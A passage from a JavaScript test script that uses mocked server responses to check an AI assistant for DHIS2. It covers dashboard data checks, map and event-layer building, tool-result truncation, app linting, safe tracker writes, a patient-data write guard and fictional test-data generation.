      { id: 'vizSVAAAAAA', displayName: 'Caesarean %', type: 'SINGLE_VALUE', periods: [{ id: '2026' }], organisationUnits: [{ id: 'ouAAAAAAAAA' }], dataDimensionItems: [PI('piEMPTYAAAA', 'Caesarean rate', "d2:condition(\"#{stageAAAAAA.deMETHODAAA} == 'C'\", 100, 0)", 'd2:hasValue(#{stageAAAAAA.deMETHODAAA})')] },
      { id: 'vizKPAAAAAA', displayName: 'Visits KPI', type: 'SINGLE_VALUE', periods: [{ id: '2026' }], organisationUnits: [{ id: 'ouAAAAAAAAA' }], dataDimensionItems: [PI('piFULLAAAAA', 'Visits', 'V{event_count}', "V{program_stage_id} == 'stageAAAAAA'")] },
      { id: 'vizZEAAAAAA', displayName: 'Near-miss count', type: 'SINGLE_VALUE', periods: [{ id: '2026' }], organisationUnits: [{ id: 'ouAAAAAAAAA' }], dataDimensionItems: [PI('piZEROAAAAA', 'Near-miss cases', 'V{enrollment_count}', '#{stageAAAAAA.deNEARAAAAA} == 1')] },
      { id: 'vizCHAAAAAA', displayName: 'Activity', type: 'COLUMN', periods: [{ id: '2026' }], organisationUnits: [{ id: 'ouAAAAAAAAA' }], dataDimensionItems: [PI('piFULLAAAAA', 'Visits', 'V{event_count}', "V{program_stage_id} == 'stageAAAAAA'"), PI('piNEARAAAAA', 'Near miss', 'V{event_count}', '#{stageAAAAAA.deNEARAAAAA} == 1')] },
    ] };
    if (path.startsWith('analytics?')) {
      if (over.tables === 'empty') return { headers: [{ name: 'dx' }, { name: 'ou' }, { name: 'pe' }, { name: 'value' }], rows: [] };
      const rows = /piFULLAAAAA/.test(path) ? [['piFULLAAAAA', 'ouAAAAAAAAA', '2026', '1026'], ['piNEARAAAAA', 'ouAAAAAAAAA', '2026', '523']] : [];
      return { headers: [{ name: 'dx' }, { name: 'ou' }, { name: 'pe' }, { name: 'value' }], rows };
    }
    if (path.startsWith('tracker/events')) {
      if (over.noRecords) return { pager: { total: 0 } };
      if (/filter=deMETHODAAA/.test(path)) return { pager: { total: 0 } };
      if (/filter=deNEARAAAAA/.test(path)) return { pager: { total: 1982 } };
      return { pager: { total: 1982 } };
    }
    if (path.startsWith('analytics/events/aggregate/')) {
      if (over.tables === 'missing') return { _error: 'Query failed because a referenced table does not exist (E7144)' };
      const held = over.tables === 'empty' ? 0 : over.tables === 'behind' ? 100 : 1982;
      return { headers: [{ name: 'pe' }, { name: 'value' }], rows: [['2026', String(held)]] };
    }
    if (path.startsWith('system/info')) return { lastAnalyticsTableSuccess: '2026-11-04T13:00:00.000' };
    if (path.startsWith('systemSettings/keyCacheStrategy')) return { keyCacheStrategy: 'CACHE_TWO_WEEKS' };
    if (path.startsWith('programs/progAAAAAAA')) return { id: 'progAAAAAAA', displayName: 'RMNCH', programStages: [{ id: 'stageAAAAAA', displayName: 'Care at birth', programStageDataElements: [{ dataElement: { id: 'deMETHODAAA', displayName: 'Delivery method' } }, { dataElement: { id: 'deNEARAAAAA', displayName: 'Near-miss' } }] }], programTrackedEntityAttributes: [] };
    if (path.startsWith('programIndicators?')) return { programIndicators: [] };
    return {};
  };
  const run = async (over = {}, metaOnly = false) => {
    vm.runInContext('_dataCheckCache.clear();', ctx);
    d.metadataOnlyTurn = metaOnly;
    ctx.safeDhis2Fetch = fixture(over);
    const c = await ctx.runDataCheck({ dashboards: ['dashAAAAAAA'] });
    d.metadataOnlyTurn = false;
    return c;
  };
  const c = await run();
  truthy('an empty tile is named, with the field behind it', c.empty_tiles?.[0]?.tile === 'Caesarean %' && /Delivery method \(Care at birth\)/.test(c.empty_tiles[0].because_no_values_in[0]));
  truthy('a tile with values is counted as having them', c.tiles.with_data === 2 && c.tiles.total === 4);
  // Malaria run (2026-11-08): "Pregnant women with malaria" = 0 was told to be "no data, not a real zero".
  truthy('a record count showing 0 while the tables hold the program is a real zero, said once', c.single_values_true_zero?.[0] === 'Near-miss count' && c.report_lines.filter(l => /"Near-miss count"/.test(l)).length === 1 && c.report_lines.some(l => /"Near-miss count" shows 0[^]*real count of zero/.test(l)) && !(c.single_values_showing_0_for_no_data || []).includes('Near-miss count'));
  truthy('a field with no values is reported with its count', c.fields_without_values?.[0]?.records === 1982);
  truthy('a field with values is not', !c.fields_without_values.some(f => /Near-miss/.test(f.field)));
  truthy('a single value showing 0 for nothing recorded is called out', c.single_values_showing_0_for_nothing_recorded?.[0] === 'Caesarean %' && c.report_lines.some(l => /not as a real zero/.test(l)));
  truthy('healthy analytics tables are not mentioned', !c.analytics_tables && !c.report_lines.some(l => /Analytics tables/.test(l)));
  const e = await run({ tables: 'empty' });
  truthy('empty analytics tables are reported as the server\'s state, not the items\' fault', e.analytics_tables?.[0]?.state === 'empty' && e.report_lines.some(l => /hold none of this program's records/.test(l) && /not at fault/.test(l)));
  truthy('…with the browser\'s two-week cache explained', e.report_lines.some(l => /CACHE_TWO_WEEKS/.test(l) && /private window/.test(l)));
  truthy('…a zero caused by the tables is not called "nothing recorded"', e.single_values_showing_0_for_no_data?.[0] === 'Visits KPI' && e.report_lines.some(l => /"Visits KPI"[^.]* shows? 0 only because of the analytics tables/.test(l)) && !e.report_lines.some(l => /"Visits KPI"[^.]*nothing is recorded/.test(l)));
  truthy('…a zero caused by an empty field still is', e.single_values_showing_0_for_nothing_recorded?.[0] === 'Caesarean %');
  truthy('…and a record count is not called a real zero while the tables are empty', e.single_values_showing_0_for_no_data?.includes('Near-miss count') && !e.single_values_true_zero);
  truthy('the model is told not to re-check live counts', /do not re-check/.test(c._note || '') && /do not re-check/.test(vm.runInContext('KB_DASHBOARDS_DETAILS', ctx)));
  const b = await run({ tables: 'behind' });
  truthy('tables holding only part of the records are reported', b.analytics_tables?.[0]?.state === 'behind' && b.report_lines.some(l => /100 of 1982/.test(l)));
  const m = await run({ tables: 'missing' });
  truthy('missing tables are reported', m.analytics_tables?.[0]?.state === 'missing');
  const fresh = await run({ noRecords: true });
  truthy('a stage with no records at all gets one line, not one per field', fresh.report_lines.filter(l => /No records yet/.test(l)).length === 1 && !fresh.report_lines.some(l => /no record on this server has a value/.test(l)) && fresh.report_lines.some(l => /Care at birth/.test(l)));
  const hidden = await run({ tables: 'behind' }, true);
  truthy('a metadata-only request still gets the findings', hidden.fields_without_values?.length === 1 && hidden.report_lines.length > 0);
  truthy('…with every number held back', !/\b(?:1982|100)\b/.test(JSON.stringify({ f: hidden.fields_without_values, r: hidden.report_lines, a: hidden.analytics_tables })));
  ctx.safeDhis2Fetch = async () => ({ _error: 'HTTP 403' });
  vm.runInContext('_dataCheckCache.clear();', ctx);
  const denied = await ctx.dataCheckForResult({ dashboards: ['dashAAAAAAA'] });
  truthy('a server that refuses every read costs nothing', denied === null);
  let slow = null;
  await Promise.race([(async () => { slow = await ctx.dataCheckWithin(new Promise(() => {}), 20); })(), new Promise(r => setTimeout(r, 400))]);
  truthy('a check that hangs is given up on', slow === null);

  // A turn: the finished work is measured, the block lands in the stream, the
  // answer and the history, whatever the model wrote.
  const enc = new TextEncoder();
  const sse = (obj) => `data: ${JSON.stringify({ choices: [{ index: 0, ...obj }] })}\n\n`;
  const turn = async (script, userText, opts = {}) => {
    vm.runInContext('conversationHistory = []; _dataCheckCache.clear();', ctx);
    const events = []; let n = 0;
    ctx.broadcast = (x) => events.push(x);
    ctx.safeDhis2Fetch = opts.fetch ? opts.fetch(fixture()) : fixture();
    ctx.executeTool = opts.exec || (async (name) => (name === 'manage_dashboards' ? { success: true, dashboard_id: 'dashAAAAAAA', dashboard_url: 'https://dhis.invalid/dhis-web-dashboard/#/dashAAAAAAA' } : { success: true }));
    ctx.fetch = async (url) => {
      if (!String(url).startsWith('https://llm.invalid')) return new Response('{"version":"2.43"}', { status: 200, headers: { 'Content-Type': 'application/json' } });
      const step = script[Math.min(n++, script.length - 1)];
      const payload = step.call
        ? sse({ delta: { tool_calls: [{ index: 0, id: `c${n}`, type: 'function', function: { name: step.call, arguments: JSON.stringify(step.args) } }] }, finish_reason: null }) + sse({ delta: {}, finish_reason: 'tool_calls' })
        : sse({ delta: { content: step.text }, finish_reason: null }) + sse({ delta: {}, finish_reason: 'stop' });
      return new Response(new ReadableStream({ start(cc) { cc.enqueue(enc.encode(`${payload}data: [DONE]\n\n`)); cc.close(); } }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
    };
    const res = await ctx.runAgenticLoop(userText, null, false);
    return { res, events, history: JSON.parse(JSON.stringify(vm.runInContext('conversationHistory', ctx))) };
  };
  vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
  const CREATE = { call: 'manage_dashboards', args: { action: 'create_dashboard', dashboard: { name: 'T' }, items: [] } };
  const built = await turn([CREATE, CREATE, { text: 'The dashboard is built.' }], 'Create a dashboard called T');
  const lastAssistant = [...built.history].reverse().find(x => x.role === 'assistant' && !x.tool_calls);
  truthy('the answer ends with the data check', /\*\*Data check\*\*/.test(built.res?.text || '') && /Delivery method \(Care at birth\)/.test(built.res?.text || ''));
  truthy('…the dashboard link is added when the answer lacks it', /Dashboard link:\*\* https:\/\/dhis\.invalid\/dhis-web-dashboard\/#\/dashAAAAAAA/.test(built.res?.text || ''));
  truthy('…the panel gets it in the stream and at the end', built.events.some(x => x.type === 'AI_STREAM_CHUNK' && /Data check/.test(x.text)) && built.events.some(x => x.type === 'AI_STREAM_END' && /Data check/.test(x.text)));
  truthy('…and the next turn remembers it', /Data check/.test(lastAssistant?.content || ''));
  const linked = await turn([CREATE, CREATE, { text: 'Open it: https://dhis.invalid/dhis-web-dashboard/#/dashAAAAAAA' }], 'Create a dashboard called T');
  truthy('a right link in the answer is not repeated', !/Dashboard link:/.test(linked.res?.text || ''));
  const readOnly = await turn([{ text: 'This server has several dashboards.' }], 'What dashboards are there?');
  truthy('a turn that saved nothing gets no block', !/Data check/.test(readOnly.res?.text || ''));
  // Partial delivery: a push per partial answer while the model keeps saving (max 3); none without progress.
  const PARTIAL = { text: 'Built the dashboard. Not built yet: the facility map and the line list.' };
  const pushes = (r) => r.events.filter(x => x.type === 'AI_THINKING' && /Finishing the remaining parts/.test(x.label || '')).length;
  const progressing = await turn([CREATE, CREATE, PARTIAL, CREATE, PARTIAL, CREATE, PARTIAL, CREATE, PARTIAL], 'Create a dashboard called T');
  truthy(`partial delivery: pushed again while each push leads to a new save (at most 3) [${pushes(progressing)}]`, pushes(progressing) === 3);
  const stuck = await turn([CREATE, CREATE, PARTIAL, PARTIAL, PARTIAL], 'Create a dashboard called T');
  truthy(`…but only once when nothing is saved after the push [${pushes(stuck)}]`, pushes(stuck) === 1);
  // A line list saved this turn but left off the turn's dashboard: one push to place it.
  {
    let placed = false;
    const exec = async (name, a) => {
      if (name === 'manage_line_lists') return { success: true, line_list_id: 'llAAAAAAAAA' };
      if (name === 'manage_dashboards' && a?.action === 'add_items') { placed = true; return { success: true, dashboard_id: 'dashAAAAAAA' }; }
      return { success: true, dashboard_id: 'dashAAAAAAA', dashboard_url: 'https://dhis.invalid/dhis-web-dashboard/#/dashAAAAAAA' };
    };
    const wrap = (base) => async (path, o) => {
      if (/^dashboards\/dashAAAAAAA\?fields=name,dashboardItems/.test(path)) return { name: 'T', dashboardItems: placed ? [{ eventVisualization: { id: 'llAAAAAAAAA' } }] : [] };
      if (/^eventVisualizations\/llAAAAAAAAA\?fields=id,name/.test(path)) return { id: 'llAAAAAAAAA', name: 'Missed appointments' };
      return base(path, o);
    };
    const LL = { call: 'manage_line_lists', args: { action: 'create', name: 'Missed appointments' } };
    const ADD = { call: 'manage_dashboards', args: { action: 'add_items', dashboard_id: 'dashAAAAAAA', items: [{ type: 'line_list', id: 'llAAAAAAAAA' }] } };
    const orphanPushes = (r) => r.events.filter(x => x.type === 'AI_THINKING' && /Placing what was built/.test(x.label || '')).length;
    const o1 = await turn([CREATE, CREATE, LL, LL, { text: 'Built: the dashboard with the missed-appointments list.' }, ADD, ADD, { text: 'Added it.' }], 'Create a dashboard called T with a missed appointments line list', { exec, fetch: wrap });
    truthy(`unplaced object: a line list saved this turn and on no dashboard gets one push, and is then added [${orphanPushes(o1)}, placed=${placed}]`, orphanPushes(o1) === 1 && placed);
    placed = true;
    const o2 = await turn([CREATE, CREATE, LL, LL, { text: 'Built.' }], 'Create a dashboard called T with a missed appointments line list', { exec, fetch: wrap });
    truthy('…no push when everything saved is on the dashboard', orphanPushes(o2) === 0);
  }

  // Line-list notes.
  truthy('the manual explains repeatable stages, header labels and column order', ['MOST RECENT', 'Column order', 'names the stage in the header', 'Identifier column'].every(w => vm.runInContext('KB_LINE_LISTS_DETAILS', ctx).includes(w)));
  truthy('the dashboard manual explains data_check and forbids swapping a field', /data_check/.test(vm.runInContext('KB_DASHBOARDS_DETAILS', ctx)) && /never swap in another field/.test(vm.runInContext('KB_DASHBOARDS_DETAILS', ctx)));
  truthy('the metadata-only prompt tells the model the check still runs', /data_check/.test(ctx.buildSystemPrompt.toString()));

  vm.runInContext('_dataCheckCache.clear();', ctx);
  ctx.safeDhis2Fetch = saved.sdf; ctx.fetch = saved.fetch; ctx.broadcast = saved.broadcast; ctx.executeTool = saved.exec;
  Object.assign(d, { baseUrl: saved.base, connected: saved.connected, apiVersion: saved.apiVersion, pageContext: saved.pageContext, metadataOnlyTurn: saved.metaOnly, turnDataCheck: saved.turn });
  vm.runInContext(`conversationHistory = ${JSON.stringify(saved.hist)};`, ctx);
}


// ── Malaria Testing and Treatment Review thread (2026-11-17, MiniMax-M3.1-flash) ──
async function runComplexBuildsChecks() {
  console.log('\nComplex builds on 2.43 (Inpatient Outcomes dashboard, Malaria Case Explorer, Contact Follow-up plugin):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
  // 1. An analytics answer on a data element with a 14,240-option set: metaData lists every option.
  const optItems = {}; const optIds = [];
  for (let i = 0; i < 14240; i++) { const id = 'Opt' + String(i).padStart(8, '0'); optIds.push(id); optItems[id] = { code: 'C' + i, name: 'C' + i + ' some diagnosis name' }; }
  const rows = Array.from({ length: 8222 }, (_, i) => ['C' + (i % 14240), 'ImspTQPwCqd', '1']);
  const meta = { items: { ...optItems, ImspTQPwCqd: { name: 'Sierra Leone' }, K6uUAvq500H: { name: 'Diagnosis (ICD-10)' }, ou: { name: 'Organisation unit' } }, dimensions: { pe: [], ou: ['ImspTQPwCqd'], K6uUAvq500H: optIds } };
  const kept = rows.slice(0, 200);
  const m = ctx.analyticsMetaDataForRows(meta, kept, [{ name: 'K6uUAvq500H' }, { name: 'ou' }, { name: 'value' }]);
  truthy('analytics metaData keeps only the options the kept rows use (200 of 14,240)', Object.keys(m.items).length < 260 && m.items.ImspTQPwCqd && m.items.K6uUAvq500H && m.items.Opt00000005);
  eq('…and says how many dimension items were withheld', [m.dimensions.K6uUAvq500H.length, m.dimensions._K6uUAvq500H_withheld], [200, 14040]);
  eq('…small dimensions untouched', m.dimensions.ou, ['ImspTQPwCqd']);
  truthy('…the trimmed answer is far below the model budget', JSON.stringify({ rows: kept, metaData: m }).length < 40000);
  // 2. The last line of defence: no tool result reaches the model above the cap.
  const huge = { _hint: 'keep me', rows: rows, metaData: meta, note: 'x'.repeat(50000) };
  const s = ctx.toolResultForModel(huge);
  truthy(`a 1.8 MB tool result goes to the model as ≤ 100,000 characters (got ${s.length})`, s.length <= 100000);
  const back = JSON.parse(s);
  truthy('…keeps the top-level hint and says what was cut', back._hint === 'keep me' && /characters/.test(back._truncated_for_model || ''));
  eq('a small tool result is passed through unchanged', ctx.toolResultForModel({ a: 1, b: [1, 2] }), JSON.stringify({ a: 1, b: [1, 2] }));
  truthy('a result that cannot be serialised becomes an error, not a crash', /could not be serialised/.test(ctx.toolResultForModel((() => { const o = {}; o.o = o; return o; })())));

  // 3. Map periods: "202608;202609;202610" was saved as ONE period id; DHIS2 dropped it and the map failed to open.
  const typeMap = { cW09nTtox14: 'PROGRAM_INDICATOR' };
  const base = { name: 'Deaths by district', data_item: 'cW09nTtox14', org_unit_level: 2, org_units: ['ImspTQPwCqd'] };
  const pe = (m) => m.map.mapViews.find(v => v.layer === 'thematic').filters[0].items.map(i => i.id);
  eq('a map period "202608;202609;202610" becomes three periods', pe(ctx.buildMapObject({ ...base, period: '202608;202609;202610' }, typeMap)), ['202608', '202609', '202610']);
  eq('…periods:[…] works the same', pe(ctx.buildMapObject({ ...base, periods: ['202608', '202609', '202610'] }, typeMap)), ['202608', '202609', '202610']);
  const dated = ctx.buildMapObject({ ...base, start_date: '2026-08-01', end_date: '2026-10-31' }, typeMap).map.mapViews.find(v => v.layer === 'thematic');
  eq('…start_date/end_date are saved as the layer\'s dates, with no period filter', [dated.startDate, dated.endDate, dated.filters], ['2026-08-01', '2026-10-31', []]);
  truthy('…a token that is no period is refused before saving', /not a period id/.test(ctx.buildMapObject({ ...base, period: '2026-08' }, typeMap)._error || ''));
  truthy('…a made-up keyword is refused', /not a DHIS2 period/.test(ctx.buildMapObject({ ...base, period: 'LAST_3_MONTH' }, typeMap)._error || ''));
  eq('…one relative keyword still works', pe(ctx.buildMapObject({ ...base, period: 'last_12_months' }, typeMap)), ['LAST_12_MONTHS']);

  // 4. Event layer: individual cases as points.
  const ev = ctx.buildEventMapObject({ name: 'Inpatient deaths', program_id: 'eBAyeGv0exc', program_stage_id: 'Zj7UnCAulEk', org_units: ['ImspTQPwCqd'], periods: ['202608', '202609', '202610'], event_filters: [{ data_element: 'fWIAEtYVEGk', filter: 'in:MODDIED' }] });
  const v = ev.map && ev.map.mapViews[0];
  truthy('an event layer is saved in the demo maps\' shape (program, stage, ou rows, pe filter, data-element filter)', v && v.layer === 'event' && v.program.id === 'eBAyeGv0exc' && v.programStage.id === 'Zj7UnCAulEk'
    && v.rows[0].items[0].id === 'ImspTQPwCqd' && v.filters[0].items.length === 3 && v.columns[0].dimension === 'fWIAEtYVEGk' && v.columns[0].filter === 'IN:MODDIED' && v.eventPointColor === '333333');
  truthy('…without a stage it is refused', /program_stage_id/.test(ctx.buildEventMapObject({ name: 'x', program_id: 'eBAyeGv0exc', org_units: ['ImspTQPwCqd'] })._error || ''));
  truthy('…a level instead of an area is refused', /not a level/.test(ctx.buildEventMapObject({ name: 'x', program_id: 'eBAyeGv0exc', program_stage_id: 'Zj7UnCAulEk', org_units: ['LEVEL-4'] })._error || ''));
  truthy('…a filter without an operator is refused', /not a filter/.test(ctx.buildEventMapObject({ name: 'x', program_id: 'eBAyeGv0exc', program_stage_id: 'Zj7UnCAulEk', org_units: ['ImspTQPwCqd'], event_filters: [{ data_element: 'fWIAEtYVEGk', filter: 'MODDIED' }] })._error || ''));

  // 5. The saved map is read back: a period DHIS2 dropped is an error, and the map is removed again.
  const d = vm.runInContext('dhis2', ctx);
  const saved = { sdf: ctx.safeDhis2Fetch, wa: d.writeAuth, base: d.baseUrl, connected: d.connected };
  Object.assign(d, { baseUrl: 'https://verify.example/dhis', connected: true, writeAuth: { scope: 'broad', reason: 'verify' } });
  const calls = [];
  try {
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      calls.push(`${o.method || 'GET'} ${p}`);
      if (/^programs\/eBAyeGv0exc/.test(p)) return { id: 'eBAyeGv0exc', displayName: 'Inpatient morbidity and mortality', programStages: [{ id: 'Zj7UnCAulEk', displayName: 'Inpatient', programStageDataElements: [{ dataElement: { id: 'fWIAEtYVEGk', displayName: 'Mode of Discharge', valueType: 'TEXT' } }] }] };
      if (o.method === 'POST' && p === 'maps') return { response: { uid: o.body.id } };
      if (/^maps\/[^?]+\?fields=mapViews/.test(p)) return { mapViews: [{ layer: 'event', periods: [], filters: [{ dimension: 'pe', items: [] }], relativePeriods: { thisYear: false } }] };
      if (o.method === 'DELETE') return {};
      if (/^analytics\/events\/count/.test(p)) return { count: 3 };
      return {};
    };
    const r = await ctx.executeTool('manage_maps', { action: 'create', layer: 'event', name: 'Inpatient cases', program_id: 'eBAyeGv0exc', org_units: ['ImspTQPwCqd'], periods: ['202608', '202609', '202610'] });
    truthy('a map saved without its period is reported as an error, not success, and deleted again', r._scope === 'map_period_dropped' && calls.some(c => /^DELETE maps\//.test(c)));
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      if (/^programs\/eBAyeGv0exc/.test(p)) return { id: 'eBAyeGv0exc', displayName: 'Inpatient morbidity and mortality', programStages: [{ id: 'Zj7UnCAulEk', displayName: 'Inpatient', programStageDataElements: [] }] };
      if (o.method === 'POST' && p === 'maps') return { response: { uid: o.body.id } };
      if (/^maps\/[^?]+\?fields=mapViews/.test(p)) return { mapViews: [{ layer: 'event', periods: [{ id: '202608' }] }] };
      if (/^analytics\/events\/count/.test(p)) return { count: 3 };
      return {};
    };
    const ok2 = await ctx.executeTool('manage_maps', { action: 'create', layer: 'event', name: 'Inpatient cases', program_id: 'eBAyeGv0exc', org_units: ['ImspTQPwCqd'], periods: ['202608', '202609', '202610'] });
    truthy('an event map on a one-stage program finds the stage itself and says how many points will be drawn', ok2.success && ok2.program_stage.id === 'Zj7UnCAulEk' && ok2.events_with_location === 3 && /3 event/.test(ok2._location_note));
  } finally { ctx.safeDhis2Fetch = saved.sdf; Object.assign(d, { writeAuth: saved.wa, baseUrl: saved.base, connected: saved.connected }); }

  // 6. App lint: a paging loop with a fixed page cap drops records silently (Contact Follow-up plugin read 4,000 of 5,433 visits).
  const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
  const root = "\nReactDOMClient.createRoot(document.getElementById('root')).render(<A />);";
  const lintErr = (body) => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', 'const A = () => null;\n' + body + root).code }, 'app', kitMeta).errors.map((e) => e.message).join(' | ');
  const loop = (cond, extra = '') => `async function f(engine) { const out = []; let page = 1; let pageCount = 1; do { const res = await engine.query({ r: { resource: 'tracker/events', params: { program: 'N7bpeUCYTbV', page, pageSize: 100, totalPages: true, orgUnitMode: 'ACCESSIBLE' } } }); (res.r.events || []).forEach((e) => out.push(e)); pageCount = res.r.pager.pageCount; page += 1; } while (${cond}); return out; }${extra}`;
  truthy('a tracker paging loop that stops at page 40 is refused before install', /stops at a fixed page \(page <= 40\)/.test(lintErr(loop('page <= pageCount && page <= 40'))));
  truthy('…the same loop that runs to pageCount is fine', !/fixed page/.test(lintErr(loop('page <= pageCount'))));
  truthy('…a cap the user is told about on screen is allowed', !/fixed page/.test(lintErr(loop('page <= pageCount && page <= 40', "\nconst NOTE = 'Showing only the first 4,000 visits (list truncated)';"))));
  const byIds = (params) => `async function g(engine, ids) { return engine.query({ r: { resource: 'tracker/enrollments', params: { ${params}, fields: 'enrollment,notes' } } }); }`;
  truthy('tracker/enrollments by enrollments=<ids> without program is refused (2.43: 400 "Program is mandatory")', /Program is mandatory/.test(lintErr(byIds("enrollments: ids.join(',')"))));
  truthy('…with program it is fine', !/Program is mandatory/.test(lintErr(byIds("program: 'ur1Edk5Oe2n', enrollments: ids.join(',')"))));

  // 14. Tracker writes: /api/tracker ignores ?dryRun=true and COMMITS; the check before a write is importMode=VALIDATE.
  {
    const te = { trackedEntities: [{ trackedEntityType: 'tetAAAAAAAA', orgUnit: 'ouAAAAAAAAA', attributes: [{ attribute: 'atAAAAAAAAA', value: 'CCR-0001' }] }] };
    const w1 = ctx.buildTrackerWriteRequest('tracker?async=false&importStrategy=CREATE', 'POST', te, {});
    truthy('tracker write: the pre-check is importMode=VALIDATE, never dryRun (which commits on /api/tracker)', w1 && /importMode=VALIDATE/.test(w1.preflightPath) && !/dryRun/.test(w1.preflightPath) && !/dryRun|importMode/.test(w1.commitPath) && !w1.dryRunOnly);
    const w2 = ctx.buildTrackerWriteRequest('tracker?async=false&importStrategy=CREATE&dryRun=true', 'POST', te, {});
    truthy('…a model\'s dryRun=true is a validation only: nothing committed, dryRun never sent', w2 && w2.dryRunOnly === true && !/dryRun/.test(`${w2.preflightPath} ${w2.commitPath}`) && /importMode=VALIDATE/.test(w2.preflightPath));
  }

  // 18. Per-copy plugin settings stay writable after a record read; anything else stays blocked.
  {
    const d18 = vm.runInContext('dhis2', ctx);
    const keep18 = { t: d18.turnCounter, r: d18.patientDataReadTurn };
    Object.assign(d18, { turnCounter: 9, patientDataReadTurn: 9 });
    try {
      eq('settings: {dateA,dateB} for a dashboard copy of an ai- app may be saved after a record read', ctx.dataStorePatientDataReason({ dateA: '2025-11-18', dateB: '2026-11-18', showMap: true }, 'dataStore/ai-malaria-focus/rl0Z9hM6rFi'), null);
      truthy('…free text (a name) in the same place is still blocked', !!ctx.dataStorePatientDataReason({ note: 'Jane Doe called' }, 'dataStore/ai-malaria-focus/rl0Z9hM6rFi'));
      truthy('…and a namespace that is not the assistant\'s app, or a key that is not an item id, too', !!ctx.dataStorePatientDataReason({ dateA: '2025-11-18' }, 'dataStore/shared-ns/rl0Z9hM6rFi') && !!ctx.dataStorePatientDataReason({ dateA: '2025-11-18' }, 'dataStore/ai-malaria-focus/settings'));
    } finally { Object.assign(d18, { turnCounter: keep18.t, patientDataReadTurn: keep18.r }); }
  }

  // 17. Test-data generator: visit dates in order, no "Other" answers, rare cancelled statuses, a manual-listed write tool.
  {
    const rnd = ctx.tdRandom(7);
    const des = [{ id: 'a', displayName: 'Result date', valueType: 'DATE' }, { id: 'b', displayName: 'Collection date', valueType: 'DATE' }, { id: 'c', displayName: 'Request date', valueType: 'DATE' }, { id: 'd', displayName: 'Next appointment date', valueType: 'DATE' }, { id: 'e', displayName: 'Symptom start date', valueType: 'DATE' }];
    const d = ctx.tdFillDates(rnd, des, '2026-03-10', '2026-11-18');
    truthy('test data: dates in one visit are ordered onset < request < collection < result < next appointment', d.e < d.c && d.c < d.b && d.b <= d.a && d.a < d.d);
    const opts = { displayName: 'Referral status', valueType: 'TEXT', optionSet: { options: [{ code: 'OTHER' }, { code: 'PENDING' }, { code: 'ACCEPTED' }, { code: 'CANCELLED' }] } };
    const picks = Array.from({ length: 300 }, () => ctx.tdValue(rnd, opts, { prefix: 'ZZ TEST', today: '2026-11-18', seq: 1 }));
    truthy(`…never "Other"; a cancelled status stays rare (${picks.filter((x) => x === 'CANCELLED').length}/300)`, !picks.includes('OTHER') && picks.filter((x) => x === 'CANCELLED').length < 60);
    truthy('…manage_test_data is a write tool with a manual summary and is routed for "create fictional people"', vm.runInContext('WRITE_CAPABLE_TOOL_NAMES', ctx).has('manage_test_data') && !!vm.runInContext('TOOL_SUMMARIES', ctx).manage_test_data && JSON.stringify(ctx.selectToolsForQuery ? [] : []) !== null);
    // Pregnancy tracker (Haiku, 2026-11-25): "add about 30 fictional test pregnancies" did not route the
    // tool, and its values tripped the program's blocking rules (5 of 29 women survived validation).
    const intent = vm.runInContext('detectTestDataIntent', ctx);
    truthy('…routed for "add about 30 fictional test pregnancies", "create 40 test children", "generate sample households"; not for a plain dashboard request',
      intent('first add about 30 fictional test pregnancies at the program\'s facilities') && intent('create 40 test children') && intent('generate some sample households')
      && !intent('Build a dashboard of pregnancies by district') && !intent('test it on several of these pregnancies'));
    const r2 = ctx.tdRandom(3);
    const many = (el, n = 300, c = {}) => Array.from({ length: n }, () => ctx.tdValue(r2, el, { prefix: 'ZZ TEST', today: '2026-11-18', seq: 1, ...c }));
    const bw = many({ displayName: 'Birth weight in grams', valueType: 'INTEGER_POSITIVE' }).map(Number);
    const ga = many({ displayName: 'Gestational age by ultrasound', valueType: 'INTEGER_POSITIVE' }).map(Number);
    const apgar = many({ displayName: 'Five-minute Apgar score', valueType: 'INTEGER' }).map(Number);
    const parity = many({ displayName: 'Parity', valueType: 'INTEGER_POSITIVE' }).map(Number);
    const sys = many({ displayName: 'Systolic Blood Pressure', valueType: 'NUMBER' }).map(Number);
    truthy('…plausible clinical values: birth weight in grams 2,600–3,900, gestational age 10–36 weeks, Apgar 7–10, a positive integer never 0; about one blood pressure in eight raised',
      bw.every(v => v >= 2600 && v <= 3900) && ga.every(v => v >= 10 && v <= 36) && apgar.every(v => v >= 7) && parity.every(v => v >= 1)
      && sys.filter(v => v >= 140).length > 15 && sys.filter(v => v >= 140).length < 70);
    const anomaly = many({ displayName: 'Fetal anomaly suspected', valueType: 'BOOLEAN' });
    const placenta = { displayName: 'Placenta location', valueType: 'TEXT', optionSet: { options: [{ code: 'NORMAL' }, { code: 'LOW_LYING' }, { code: 'PLACENTA_PREVIA' }, { code: 'SUSPECTED_ABRUPTION' }, { code: 'UNKNOWN' }] } };
    truthy('…an alarming yes/no is rarely yes; a "normal" answer is the common one; calm mode (a refused visit drawn again) always picks normal, turns only alarming answers to no and keeps the rest',
      anomaly.filter(x => x === 'true').length < 40 && many(placenta).filter(x => x === 'NORMAL').length > 150
      && many(placenta, 50, { calm: true }).every(x => x === 'NORMAL') && ctx.tdValue(r2, { displayName: 'Fetal anomaly suspected', valueType: 'BOOLEAN' }, { calm: true }) === 'false'
      && ctx.tdValue(r2, { displayName: 'Last menstrual period known', valueType: 'BOOLEAN' }, { calm: true }) === null);
    // Cold Chain on play (2026-11-26): 440 visits dropped — points on stages without coordinates (E1074),
    // equal "sending"/"receiving" text, minimum above maximum.
    const dv = [{ dataElement: 'mn', value: '9.5' }, { dataElement: 'mx', value: '3.1' }, { dataElement: 'cur', value: '5' }];
    ctx.tdOrderMinMax([{ id: 'mn', displayName: 'Minimum temperature reading' }, { id: 'mx', displayName: 'Maximum temperature reading' }, { id: 'cur', displayName: 'Current temperature' }], dv);
